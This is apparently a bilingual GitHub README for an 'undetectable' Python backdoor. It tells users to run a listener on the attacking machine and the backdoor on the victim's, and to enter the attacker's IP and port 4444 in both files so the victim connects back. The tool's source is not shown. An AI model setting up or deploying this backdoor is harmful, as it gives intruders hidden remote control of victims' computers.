# backdoor-python

![backdoor2](https://user-images.githubusercontent.com/51070590/84421419-c8e5a400-abd8-11ea-9205-a314a1f154a7.PNG)

[![Github Release Version](https://img.shields.io/badge/version-1.3-green)](https://github.com/MarceloNoguera/backdoor-python)
[![Github Release Version](https://img.shields.io/badge/python-2.7-green.svg)](https://github.com/MarceloNoguera/backdoor-python)
[![RTA loves Open source](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/MarceloNoguera/backdoor-python)

#### Spanish
<p>Backdoor indetectable escrito en Python <br>
  
El archivo listener.py se ejecuta en la maquina atacante y en archivo backdoor en 
la maquina victima.

Para que funcione deben modificar el codigo al final de ambos archivos y agregar la
IP de la maquina atacante en ambos.

Remplazen "0.0.0.0" por la IP del atacante <br>

my_listener = Listener("0.0.0.0", 4444)<br>
my_backdoor = Backdoor("0.0.0.0", 4444)

_______________________________________________________________________________________________________
#### Inglish
Undetectable backdoor written in Python

The file listener.py is executed on the attacking machine and in the backdoor file in 
the victim machine.

In order for it to work you must modify the code at the end of both files and add the
IP of the attacking machine on both.

Replace "0.0.0.0" with the attacker's IP <br>

my_listener = Listener("0.0.0.0", 4444)<br>
my_backdoor = Backdoor("0.0.0.0", 4444)</p>


